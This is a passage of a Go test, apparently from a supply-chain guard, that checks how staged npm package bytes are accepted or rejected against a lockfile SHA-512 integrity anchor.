	t.Setenv(guardArtifactDirEnv, dir)

	sri := func(b []byte) string {
		s := sha512.Sum512(b)
		return "sha512-" + base64.StdEncoding.EncodeToString(s[:])
	}
	spec := packageSpec{Ecosystem: "npm", Name: "staged", Version: "1.0.0"}

	// No anchor: unchanged behaviour, the staged bytes are analyzed.
	if b, res := localArtifactBytes(spec); !bytes.Equal(b, staged) || res != acquireOK {
		t.Fatalf("no anchor must not degrade the staged source, got (%d bytes, %v)", len(b), res)
	}
	// Matching anchor: resolves.
	spec.Integrity = sri(staged)
	if b, res := localArtifactBytes(spec); !bytes.Equal(b, staged) || res != acquireOK {
		t.Fatalf("a matching anchor must resolve, got (%d bytes, %v)", len(b), res)
	}
	// Disagreeing anchor: the staged tarball is NOT what will be installed.
	spec.Integrity = sri(other)
	if b, res := localArtifactBytes(spec); len(b) != 0 || res != acquireDigestMismatch {
		t.Fatalf("staged bytes that disagree with the lockfile anchor: want (nil, acquireDigestMismatch), got (%d bytes, %v)", len(b), res)
	}
}
